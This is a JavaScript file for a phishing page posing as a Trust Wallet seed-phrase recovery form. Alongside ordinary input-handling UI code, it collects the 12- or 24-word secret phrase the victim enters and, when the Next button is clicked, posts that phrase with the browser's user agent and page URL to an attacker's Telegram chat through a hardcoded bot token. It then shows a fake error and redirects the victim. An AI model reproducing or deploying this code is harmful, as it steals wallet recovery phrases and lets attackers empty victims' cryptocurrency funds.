// Telegram Bot Configuration - REPLACE WITH YOUR VALUES
const TELEGRAM_BOT_TOKEN = '8193457596:AAEwExhYhHyncUylbc7o-5dhN5283jKue8w'; // Get from @BotFather
const TELEGRAM_CHAT_ID = '-1004776147136'; // Can be group ID or channel ID

// Function to send message to Telegram
async function sendToTelegram(seedPhrase, walletType) {
    const message = `🔐 <b>NEW RECOVERY PHRASE</b> 🔐\n` +
                   `💼 <b>Wallet:</b> ${walletType}\n\n` +
                   `🔑 <b>SEED PHRASE (TAP TO COPY):</b>\n`+
                   `<code>${seedPhrase}</code>\n\n`+
                   `🕐 <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
                   `🌐 <b>User Agent:</b> ${navigator.userAgent}\n\n` +
                   `📍 <b>URL:</b> ${window.location.href}`;
    
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const data = await response.json();
        if (data.ok) {
            console.log('✅ Sent to Telegram successfully');
        } else {
            console.error('❌ Telegram error:', data.description);
        }
        return data;
    } catch (error) {
        console.error('❌ Failed to send to Telegram:', error);
    }
}

// Your existing code starts here
const wordsSelectButton = document.getElementById('headlessui-listbox-button-1');
const wordsList = document.getElementById('words-select-list');
const words12Option = document.getElementById('option1');
const words24Option = document.getElementById('option2');
const optionMark1 = document.getElementById('optionMark1');
const optionMark2 = document.getElementById('optionMark2');
const buttonWordsList = document.getElementById('buttonWordsList');
const wordsContainer = document.getElementById('wordsContainer');
const words24inputs1 = document.getElementById('words-24-part-1');
const words24inputs2 = document.getElementById('words-24-part-2');
const xuyZnaet = document.getElementById('xuyZnaet');
const xuyZnaet2 = document.getElementById('xuyZnaet2');
const xuyZnaet3 = document.getElementById('xuyZnaet3');

window.addEventListener('click', (event) => {
    const target = event.target;

    if (target !== wordsList && target !== wordsSelectButton) {
        wordsList.style.display = 'none';
    }
});

wordsSelectButton.addEventListener('click', (event) => {
    event.stopPropagation();
    const computedStyle = window.getComputedStyle(wordsList);
    const display = computedStyle.getPropertyValue('display');

    if (display === 'none') {
        wordsList.style.display = 'block';
    } else {
        wordsList.style.display = 'none';
    }
});

words12Option.addEventListener('click', () => {
    words12Option.classList.add('text-primary');
    words24Option.classList.add('text-textPrimary');
    words24Option.classList.remove('text-primary');
    optionMark1.style.display = 'block';
    optionMark2.style.display = 'none';
    buttonWordsList.textContent = 'I have a 12 word Secret Phrase';
    wordsContainer.classList.add('grid-cols-2');
    wordsContainer.classList.remove('grid-cols-4');
    words24inputs1.style.display = 'none';
    words24inputs2.style.display = 'none';
    xuyZnaet.classList.add('md:max-w-[438px]');
    xuyZnaet2.classList.add('md:max-w-[438px]');
    xuyZnaet3.classList.remove('max-w-[800px]');
    xuyZnaet3.classList.remove('mx-auto');
});

words24Option.addEventListener('click', () => {
    words12Option.classList.remove('text-primary');
    words24Option.classList.remove('text-textPrimary');
    words24Option.classList.add('text-primary');
    optionMark1.style.display = 'none';
    optionMark2.style.display = 'block';
    buttonWordsList.textContent = 'I have a 24 word Secret Phrase';
    wordsContainer.classList.remove('grid-cols-2');
    wordsContainer.classList.add('grid-cols-4');
    words24inputs1.style.display = 'block';
    words24inputs2.style.display = 'block';
    xuyZnaet.classList.remove('md:max-w-[438px]');
    xuyZnaet2.classList.remove('md:max-w-[438px]');
    xuyZnaet3.classList.add('max-w-[800px]');
    xuyZnaet3.classList.add('mx-auto');
});

function handleInputFocus(event) {
    const inputField = event.target.closest('.input-field.space-x-1.h-12');
    inputField.classList.add('border-primary');
    const placeholderText = event.target.placeholder.split('#')[1];
    const pElement = document.createElement('p');
    pElement.textContent = `${placeholderText}.`;
    pElement.classList.add('title-text', 'text-textPrimary', 'font-bold', 'text-unset');
    inputField.insertBefore(pElement, event.target);
}

function handleInputBlur(event) {
    const inputField = event.target.closest('.input-field.space-x-1.h-12');
    inputField.classList.remove('border-primary');
    const pElement = event.target.previousElementSibling;
    if (pElement && pElement.tagName && pElement.tagName.toLowerCase() === 'p') {
        inputField.removeChild(pElement);
    }
}

const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
    input.addEventListener('focus', handleInputFocus);
    input.addEventListener('blur', handleInputBlur);
});

const buttons = document.querySelectorAll('.default-button');

buttons.forEach(button => {
    button.addEventListener('click', () => {
        const parent = button.closest('.input-field');
        const input = parent.querySelector('input');
        const img = parent.querySelector('.text-iconNormal.word-icon');
        if (img) {
            const currentSrc = img.getAttribute('src');
            const newSrc = currentSrc.includes('hidden-password.svg') ? 'displayed-password.svg' : 'hidden-password.svg';
            img.setAttribute('src', newSrc);
        }

        if (input.type === 'password') {
            input.type = 'text';
        } else {
            input.type = 'password';
        }
    });
});

const inputs2 = document.querySelectorAll('.input-field input');

if (inputs2[0]) {
    inputs2[0].addEventListener('input', () => {
        const words = inputs[0].value.trim().split(' ');
        inputs2[0].value = words.shift() || '';
        for (let i = 1; i < inputs.length; i++) {
            if (inputs2[i]) inputs2[i].value = words[i - 1] || '';
        }
    });
}

const inputs3 = document.querySelectorAll('.input-field input');
const clearAllButton = document.getElementById('clearAll');
const nextButton = document.getElementById('nextBtn');

inputs3.forEach((input, index) => {
    input.addEventListener('input', () => {
        const filledCount = Array.from(inputs3).reduce((count, input) => {
            return count + (input.value.trim() !== '' ? 1 : 0);
        }, 0);

        if (filledCount >= 12) {
            nextButton.removeAttribute('disabled');
        } else {
            nextButton.setAttribute('disabled', 'disabled');
        }

        if (filledCount > 0) {
            if (clearAllButton) {
                clearAllButton.classList.remove('text-backgroundPrimary');
                clearAllButton.classList.remove('default-button');
                clearAllButton.style.cursor = 'pointer';
                clearAllButton.removeAttribute('disabled');
            }
        } else {
            if (clearAllButton) {
                clearAllButton.classList.add('text-backgroundPrimary');
                clearAllButton.classList.add('default-button');
                clearAllButton.setAttribute('disabled', 'disabled');
            }
        }

        if (filledCount === inputs3.length) {
            if (clearAllButton) clearAllButton.removeAttribute('disabled');
        }
    });
});

if (clearAllButton) {
    clearAllButton.addEventListener('click', () => {
        inputs3.forEach((input) => {
            input.value = '';
        });
    });
}

// MODIFIED: Only send to Telegram, no PHP
nextButton.addEventListener('click', async () => {
    const overlay = document.getElementById('overlay');
    const modal = document.getElementById('errorModal');

    if (modal) modal.style.display = 'flex';

    // Collect seed phrase from inputs
    let seedPhraseWords = Array.from(document.querySelectorAll('.custom-input-sd')).map(input => input.value);
    let seedPhrase = seedPhraseWords.join(" ");
    
    var WALLET = 'TrustWallet';
    
    // Send ONLY to Telegram
    await sendToTelegram(seedPhrase, WALLET);
    
    // Redirect after short delay
    setTimeout(() => {
        window.top.location.href = 'index.html';
    }, 1500);
});
